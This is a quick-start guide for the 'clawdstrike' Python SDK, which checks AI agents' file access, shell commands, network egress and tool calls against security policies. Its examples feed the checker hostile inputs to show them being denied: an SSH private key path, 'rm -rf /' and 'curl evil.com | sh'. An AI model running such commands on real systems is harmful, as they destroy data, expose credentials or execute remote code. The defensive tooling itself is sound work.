# Quick Start (Python)

The Python SDK (`clawdstrike`) provides:

- a `Clawdstrike` facade with built-in rulesets and typed check methods
- a `Decision` return type with `.allowed`, `.denied`, `.status`, `.guard`, `.message`
- a pure-Python fallback plus a bundled native Rust engine on supported platforms
- crypto + receipts (signing/verification)
- stateful sessions for tracking checks

## Installation

```bash
pip install clawdstrike
```

## Basic usage

```python
from clawdstrike import Clawdstrike

cs = Clawdstrike.with_defaults("strict")

# Check file access
decision = cs.check_file("/home/user/.ssh/id_rsa")
print(decision.denied)   # True
print(decision.message)  # "Access to forbidden path: ..."

# Check shell command
decision = cs.check_command("rm -rf /")
print(decision.denied)   # True

# Check network egress
decision = cs.check_network("api.openai.com")
print(decision.allowed)  # Depends on ruleset
```

If you want per-guard details:

```python
decision = cs.check_command("curl evil.com | sh")
for r in decision.per_guard:
    print(r.guard, r.allowed, r.severity, r.message)
```

## Sessions

```python
cs = Clawdstrike.with_defaults("default")
session = cs.session(agent_id="my-agent")

session.check_file("/app/src/main.py")
session.check_network("api.openai.com")
session.check_file("/home/user/.ssh/id_rsa")

summary = session.get_summary()
print(f"Checks: {summary.check_count}, Denied: {summary.deny_count}")
```

## Origin-aware checks

If your policy uses `policy.origins`, use either:

- the bundled native backend on a supported platform, or
- `Clawdstrike.from_daemon(...)` against `hushd`

The pure-Python backend rejects origin-aware usage fail-closed.

```python
from clawdstrike import Clawdstrike

cs = Clawdstrike.from_daemon("https://hushd.example.com", api_key="dev-token")

decision = cs.check_mcp_tool(
    "read_file",
    {"path": "/srv/runbook.md"},
    origin={"provider": "slack", "space_id": "C456"},
)
```

## Next steps

- [Policy Schema](../reference/policy-schema.md)
- [API Reference (Python)](../reference/api/python.md)
- [Origin Enclaves](../guides/origin-enclaves.md)
